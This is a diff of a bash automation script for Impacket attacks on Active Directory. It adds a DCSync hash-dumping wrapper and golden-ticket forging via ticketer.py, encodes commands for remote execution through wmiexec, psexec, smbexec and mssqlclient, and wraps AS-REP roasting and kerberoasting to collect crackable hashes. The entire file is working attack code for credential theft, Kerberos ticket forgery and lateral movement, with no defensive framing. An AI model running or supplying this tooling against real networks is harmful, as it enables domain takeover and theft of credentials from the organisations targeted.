@@ -1,6 +1,6 @@
 #!/bin/bash
 
-perform_impacket() {
+run_impacket() {
     local impacket_command="$1"
     if [[ -z "$impacket_command" ]]; then
         echo "Impacket command must be specified."
@@ -80,33 +80,86 @@ perform_impacket() {
         if [[ -z "$cmd" ]]; then
             echo "Command must be set when run_cmd is true."
         fi
-        run_cmd_option="$cmd"
+        if [[ "$cmd" == *powershell* ]]; then
+            run_cmd_option="$cmd"
+        else
+            run_cmd_option=$(encode_powershell "$cmd")
+        fi
+        run_cmd_option=$(echo "$run_cmd_option" | sed 's/"/\\"/g')
     fi
     echo "target=$target"
-    echo ${proxychain_command}$impacket_command $impacket_command_options $target "$run_cmd_option"
+    echo ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target "$run_cmd_option"
     if [[ -z $run_cmd_option ]]; then
         eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target | tee -a $trail_log
     else
+        #echo ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target \"$run_cmd_option\" 
         eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target \"$run_cmd_option\" | tee -a $trail_log
     fi
 }
 
-perform_impacket_secretsdump () {
+run_impacket_secretsdump () {
 
     if [[ -z "$hash_file" ]]; then
         hash_file="hashes.secretsdump"
     fi
+    local target_username_option=""
     if [[ -z "$target_username" ]]; then
-        echo "Target username must be set before running secretsdump."
-        return 1
+        echo "Target username was not set. Assuming just-dc-user was not needed"
+    else
+        target_username_option="-just-dc-user $target_username"
     fi
     output_hashes="true"
-    perform_impacket "impacket-secretsdump" "-just-dc-user $target_username"
+    run_impacket "impacket-secretsdump" "$target_username_option"
 
 }
 
+run_impacket_dcsync() {
+    
+    if [[ -z "$target_ip" ]]; then
+        echo "Target ip must be set before running dcsync."
+        return 1
+    fi  
+    hash_file="hashes.dcsync.$target_ip"
+    if [[ -f "$hash_file.secrets" ]]; then
+        echo "$hash_file already exists, skipping dcsync"
+        return 0
+    fi
+    run_impacket_secretsdump
 
-perform_impacket_wmiexec() {
+}
+
+run_impacket_golden_ticket() {
+
+    if [[ -z "$aes_key" ]]; then
+        echo "AES key must be set before running golden ticket."
+        return 1
+    fi
+    if [[ -z $domain_sid ]]; then
+        echo "Domain SID must be set before running golden ticket."
+        return 1
+    fi
+    if [[ -z $domain ]]; then
+        echo "Domain must be set before running golden ticket."
+        return 1
+    fi
+    if [[ -z $ticket_username ]]; then
+        echo "Ticket username must be set before running golden ticket."
+        return 1
+    fi
+    if [[ -z $ticket_uid ]]; then
+        echo "Ticket UID must be set before running golden ticket."
+        return 1
+    fi
+    local additional_options=""
+    if [[ ! -z "$extra_sid" ]]; then
+        echo "Using extra SID: $extra_sid"
+        additional_options="$additional_options -extra-sid $extra_sid"
+    fi
+    echo ticketer.py -aesKey $aes_key -domain-sid $domain_sid -domain $domain -user-id $ticket_uid $additional_options "$ticket_username"
+    ticketer.py -aesKey $aes_key -domain-sid $domain_sid -domain $domain -user-id $ticket_uid $additional_options "$ticket_username"
+
+}
+run_impacket_wmiexec() {
     if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, NTLM hash, and target IP address must be set before running Impacket WMICExec command."
         return 1
@@ -116,10 +169,10 @@ perform_impacket_wmiexec() {
         return 0
     fi
     output_hashes="false"
-    perform_impacket "impacket-wmiexec" "$1"
+    run_impacket "impacket-wmiexec" "$1"
 }
 
-perform_impacket_psexec() {
+run_impacket_psexec() {
     if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, NTLM hash, and target IP address must be set before running Impacket PsExec command."
         return 1
@@ -129,10 +182,10 @@ perform_impacket_psexec() {
         return 0
     fi
     output_hashes="false"
-    perform_impacket "impacket-psexec" "$1"
+    run_impacket "impacket-psexec" "$1"
 }
 
-perform_impacket_smbexec() {
+run_impacket_smbexec() {
     if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
         return 1
@@ -142,10 +195,10 @@ perform_impacket_smbexec() {
         return 0
     fi
     output_hashes="false"
-    perform_impacket "impacket-smbexec" "$1"
+    run_impacket "impacket-smbexec" "$1"
 }
 
-perform_impacket_mssqlclient() {
+run_impacket_mssqlclient() {
     if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
         echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
         return 1
@@ -155,23 +208,22 @@ perform_impacket_mssqlclient() {
         return 0
     fi
     output_hashes="false"
-    perform_impacket "impacket-mssqlclient" "$1"
+    run_impacket "impacket-mssqlclient" "$1"
 }
 
-perform_asrep_roasting() {
+run_impacket_asrep_roasting() {
     if [[ -z "$hash_file" ]]; then
         hash_file="hashes.asreproast"
     fi
     output_hashes="true"
-    perform_impacket "impacket-GetNPUsers" "-request $1"
+    run_impacket "impacket-GetNPUsers" "-request $1"
 }
 
-perform_impacket_kerberoast() {
+run_impacket_kerberoast() {
     if [[ -z "$hash_file" ]]; then
         hash_file="hashes.kerberoast"
     fi
     target_ip=
     output_hashes="true"
-    perform_impacket "impacket-GetUserSPNs" "-request $1"
+    run_impacket "impacket-GetUserSPNs" "-request $1"
 }
-
